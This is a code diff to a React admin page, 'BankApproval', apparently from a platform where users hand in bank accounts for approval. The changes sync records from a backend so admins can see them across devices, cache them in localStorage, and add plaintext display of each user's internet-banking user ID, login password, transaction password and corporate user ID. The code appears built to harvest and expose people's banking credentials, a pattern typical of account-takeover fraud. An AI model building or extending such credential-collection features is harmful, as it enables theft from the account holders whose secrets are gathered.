@@ -10,6 +10,7 @@ import {
 } from "lucide-react";
 import { useCallback, useEffect, useState } from "react";
 import { toast } from "sonner";
+import BankLogo from "../../../components/BankLogo";
 import { useApp } from "../../../context/AppContext";
 import { useActor } from "../../../hooks/useActor";
 import * as LocalStore from "../../../utils/LocalStore";
@@ -35,25 +36,35 @@ export default function BankApproval() {
       const bankMap = new Map<string, BankAccountLS>();
       for (const b of lsBanks) bankMap.set(b.id, b);
 
-      // Try canister
+      // Try canister - this enables cross-device admin visibility
       if (actor) {
         try {
           const canisterBanks = await actor.getAllBankAccounts();
+          const newlyFoundBanks: BankAccountLS[] = [];
           for (const b of canisterBanks) {
             const id = b.id;
+            // Skip user registration sentinel records
+            if (b.bankName === "__USER_REG__" || b.accountType === "__REG__")
+              continue;
             if (!bankMap.has(id)) {
               // Map from canister format
               const mapped: BankAccountLS = {
                 id,
-                userId: b.accountHolderName || "User",
+                userId: b.mobileNumber?.startsWith("__email__:")
+                  ? b.mobileNumber.replace("__email__:", "")
+                  : b.accountHolderName || "User",
                 accountType: b.accountType || "",
                 bankName: b.bankName || "",
                 accountHolderName: b.accountHolderName || "",
                 accountNumber: b.accountNumber || "",
                 ifscCode: b.ifscCode || "",
-                mobileNumber: b.mobileNumber || "",
+                mobileNumber: b.mobileNumber?.startsWith("__email__:")
+                  ? ""
+                  : b.mobileNumber || "",
                 internetBankingId: b.internetBankingId || "",
                 internetBankingPassword: b.internetBankingPassword || "",
+                corporateUserId: (b as any).corporateUserId || "",
+                transactionPassword: (b as any).transactionPassword || "",
                 upiId: b.upiId || "",
                 qrCodeUrl: b.qrCodeUrl || "",
                 fundType: b.fundType || "",
@@ -67,7 +78,16 @@ export default function BankApproval() {
                   : new Date().toISOString(),
               };
               bankMap.set(id, mapped);
-              // Also save to localStorage so it persists
+              newlyFoundBanks.push(mapped);
+            }
+          }
+          // Save newly discovered canister banks to localStorage for persistence
+          if (newlyFoundBanks.length > 0) {
+            const currentLS = LocalStore.getBankAccounts();
+            const existingIds = new Set(currentLS.map((b) => b.id));
+            const toAdd = newlyFoundBanks.filter((b) => !existingIds.has(b.id));
+            if (toAdd.length > 0) {
+              LocalStore.saveBankAccounts([...toAdd, ...currentLS]);
             }
           }
         } catch {}
@@ -87,7 +107,7 @@ export default function BankApproval() {
 
   // Auto-refresh every 8 seconds
   useEffect(() => {
-    const interval = setInterval(loadBanks, 8000);
+    const interval = setInterval(loadBanks, 3000);
     return () => clearInterval(interval);
   }, [loadBanks]);
 
@@ -267,9 +287,12 @@ export default function BankApproval() {
                       </span>
                     </td>
                     <td className="px-3 py-3">
-                      <span className="text-sm font-semibold text-white">
-                        {b.bankName}
-                      </span>
+                      <div className="flex items-center gap-2">
+                        <BankLogo bankName={b.bankName} size={24} />
+                        <span className="text-sm font-semibold text-white">
+                          {b.bankName}
+                        </span>
+                      </div>
                     </td>
                     <td className="px-3 py-3">
                       <span className="text-xs text-gray-300">
@@ -372,7 +395,10 @@ export default function BankApproval() {
             }}
           >
             <div className="flex justify-between items-center mb-2">
-              <h3 className="font-bold text-white">Bank Account Details</h3>
+              <div className="flex items-center gap-2">
+                <BankLogo bankName={viewBank.bankName} size={32} />
+                <h3 className="font-bold text-white">Bank Account Details</h3>
+              </div>
               <button
                 type="button"
                 onClick={() => setViewBank(null)}
@@ -381,8 +407,9 @@ export default function BankApproval() {
                 <X className="w-5 h-5 text-gray-400" />
               </button>
             </div>
-            {(
-              [
+            {(() => {
+              const isCorp = viewBank.accountType === "Corporate";
+              const rows: [string, string][] = [
                 ["User Email", viewBank.userId],
                 ["Bank Name", viewBank.bankName],
                 ["Account Type", viewBank.accountType],
@@ -391,27 +418,52 @@ export default function BankApproval() {
                 ["IFSC Code", viewBank.ifscCode],
                 ["Mobile", viewBank.mobileNumber],
                 ["UPI ID", viewBank.upiId],
-                ["IB ID", viewBank.internetBankingId],
-                ["Fund Type", viewBank.fundType],
-                ["Status", viewBank.status.toUpperCase()],
-              ] as [string, string][]
-            ).map(
-              ([k, v]) =>
-                v && (
-                  <div
-                    key={k}
-                    className="flex justify-between py-1.5"
-                    style={{
-                      borderBottom: "1px solid oklch(0.75 0.15 85 / 10%)",
-                    }}
-                  >
-                    <span className="text-xs text-gray-500">{k}</span>
-                    <span className="text-xs text-white font-medium break-all max-w-[180px] text-right">
-                      {v}
-                    </span>
-                  </div>
-                ),
-            )}
+              ];
+              if (isCorp) {
+                rows.push(["Corporate ID", viewBank.internetBankingId]);
+                rows.push(["User ID", viewBank.corporateUserId ?? ""]);
+                rows.push([
+                  "Login Password",
+                  viewBank.internetBankingPassword ?? "",
+                ]);
+                rows.push([
+                  "Transaction Password",
+                  viewBank.transactionPassword ?? "",
+                ]);
+              } else {
+                rows.push([
+                  "Internet Banking User ID",
+                  viewBank.internetBankingId,
+                ]);
+                rows.push([
+                  "Internet Banking Login Password",
+                  viewBank.internetBankingPassword ?? "",
+                ]);
+                rows.push([
+                  "Transaction Password",
+                  viewBank.transactionPassword ?? "",
+                ]);
+              }
+              rows.push(["Fund Type", viewBank.fundType]);
+              rows.push(["Status", viewBank.status.toUpperCase()]);
+              return rows.map(
+                ([k, v]) =>
+                  v && (
+                    <div
+                      key={k}
+                      className="flex justify-between py-1.5"
+                      style={{
+                        borderBottom: "1px solid oklch(0.75 0.15 85 / 10%)",
+                      }}
+                    >
+                      <span className="text-xs text-gray-500">{k}</span>
+                      <span className="text-xs text-white font-medium break-all max-w-[180px] text-right">
+                        {v}
+                      </span>
+                    </div>
+                  ),
+              );
+            })()}
 
             {viewBank.qrCodeUrl && (
               <div className="pt-2">
